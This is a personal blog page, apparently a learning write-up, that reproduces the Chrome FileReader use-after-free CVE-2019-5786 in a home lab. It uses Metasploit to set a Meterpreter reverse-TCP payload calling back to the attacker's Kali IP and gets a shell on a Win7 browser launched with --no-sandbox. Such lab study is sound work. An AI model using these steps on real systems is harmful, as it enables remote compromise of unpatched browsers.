<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>CVE-2019-5786 | Sinky&#39;s Blog</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="前言： 这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！ 环境kali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 浏览下载链接推荐：https:&#x2F;&#x2F;dl.google.com&#x2F;release2&#x2F;chrome&#x2F;AMavr_Q0teHn_72.0.3626.119&#x2F;72.0.3626">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-5786">
<meta property="og:url" content="https://github.com/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-5786/index.html">
<meta property="og:site_name" content="Sinky&#39;s Blog">
<meta property="og:description" content="前言： 这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！ 环境kali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 浏览下载链接推荐：https:&#x2F;&#x2F;dl.google.com&#x2F;release2&#x2F;chrome&#x2F;AMavr_Q0teHn_72.0.3626.119&#x2F;72.0.3626">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png">
<meta property="og:image" content="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png">
<meta property="og:image" content="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png">
<meta property="og:image" content="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png">
<meta property="article:published_time" content="2022-08-09T08:02:35.739Z">
<meta property="article:modified_time" content="2022-08-09T08:03:08.820Z">
<meta property="article:author" content="Sinky">
<meta property="article:tag" content="chrome_bug">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png">
  
    <link rel="alternative" href="/atom.xml" title="Sinky&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 6.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">Sinky</a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
				        
							<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
						<!-- music -->
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/SinkyQ/SinkyQ.github.io.git/tags/Buu/" style="font-size: 10px;">Buu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/RE/" style="font-size: 10px;">RE</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/Re/" style="font-size: 10px;">Re</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/bp/" style="font-size: 10px;">bp</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/" style="font-size: 13.33px;">chrome_bug</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 10px;">chrome调试</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/" style="font-size: 13.33px;">pikachu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/web/" style="font-size: 10px;">web</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 13.33px;">学习笔记</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">I&#39;m a developer.</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
		        
					<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-CVE-2019-5786" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-5786/" class="article-date">
  	<time datetime="2022-08-09T08:02:35.739Z" itemprop="datePublished">2022-08-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2019-5786
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
	</div>

        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前言：</p>
<p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali</p>
<p>win7_x86</p>
<p>Google_chrome_(32bit)_v72.0.3626.119</p>
<p>浏览下载链接推荐：<a target="_blank" rel="noopener" href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p>
<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p>
<pre><code>root@kali:~# msfconsole -q
msf5 &gt; search chrome_filereader
</code></pre>
<blockquote>
<p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p>
</blockquote>
<p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p>
<p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p>
<h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p>
<ul>
<li><p>readyState：表示读取状态</p>
<ul>
<li>empty,0,尚未读取</li>
<li>loading,1,正在读取</li>
<li>done,2,读取完成</li>
</ul>
</li>
<li><p>result：表示读取结果，具体格式与读取方式有关：</p>
<ul>
<li>readAsArrayBuffer</li>
<li>readAsBinaryString</li>
<li>readAsDataURL</li>
<li>readAsText</li>
</ul>
</li>
<li><p>onprogress：回调函数</p>
<ul>
<li>读取Blob触发</li>
<li>当数据较多时会周期性触发多次</li>
</ul>
</li>
<li><p>onloadend：回调函数</p>
<ul>
<li>读取操作完成时触发，不论读取成功或失败</li>
</ul>
</li>
</ul>
<p>查看模块信息</p>
<p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p>
<p>漏洞介绍：</p>
<pre><code>Payload information:
Description:
  This exploit takes advantage of a use after free vulnerability in 
  Google Chrome 72.0.3626.119 running on Windows 7 x86. The 
  FileReader.readAsArrayBuffer function can return multiple references 
  to the same ArrayBuffer object, which can be freed and overwritten 
  with sprayed objects. The dangling ArrayBuffer reference can be used 
  to access the sprayed objects, allowing arbitrary memory access from 
  Javascript. This is used to write and execute shellcode in a 
  WebAssembly object. The shellcode is executed within the Chrome 
  sandbox, so you must explicitly disable the sandbox for the payload 
  to be successful.
</code></pre>
<p>选择payload</p>
<pre><code>-&gt; set payload windows/meterpreter/reverse_tcp
</code></pre>
<blockquote>
<p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p>
</blockquote>
<p>设置payload参数：LHOST为kali ip</p>
<pre><code>-&gt; set LHOST 192.168.119.128
</code></pre>
<p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p>
<p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
<p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p>
<p>启动服务：run 或者exploit</p>
<p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe</p>
<pre><code>-&gt; chrome.exe --no-sandbox
</code></pre>
<p>在弹出的chome浏览器中访问kali ip: <a target="_blank" rel="noopener" href="http://192.168.119.128:8080/">http://192.168.119.128:8080</a></p>
<p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p>
<pre><code>https://github.com/exodusintel/CVE-2019-5786 
</code></pre>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-CSRF/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          pikachu-CSRF
        
      </div>
    </a>
  
  
    <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/CVE-2019-0708/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">CVE-2019-0708</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2022 Sinky
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/SinkyQ/SinkyQ.github.io.git/js/main.js"></script>




  </div>
</body>
</html>